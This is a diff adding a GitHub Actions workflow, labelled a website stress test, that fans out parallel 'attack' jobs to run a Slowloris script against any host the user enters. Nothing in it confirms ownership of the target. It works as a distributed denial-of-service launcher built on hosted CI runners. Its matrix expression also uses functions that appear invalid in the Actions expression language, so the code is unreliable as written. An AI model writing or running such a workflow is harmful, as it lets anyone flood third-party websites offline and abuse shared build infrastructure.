@@ -1,0 +1,39 @@
+name: Website Stress Test
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_host:
+        description: 'Website to test (e.g., yourwebsite.com)'
+        required: true
+      socket_count:
+        description: 'Number of sockets per job'
+        required: true
+        default: '150'
+      job_count:
+        description: 'Number of parallel jobs (attackers)'
+        required: true
+        default: '10'
+
+jobs:
+  attack-job:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        # Tạo ra một danh sách các job dựa trên input
+        instance: ${{ fromJson(format('[{0}]', range(1, add(inputs.job_count, 1)) | join(','))) }}
+    
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v3
+
+    - name: Set up Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.x'
+
+    - name: Run Slowloris Test
+      run: |
+        echo "Starting attack from instance ${{ matrix.instance }}..."
+        python slowloris_tester.py ${{ github.event.inputs.target_host }} -s ${{ github.event.inputs.socket_count }}
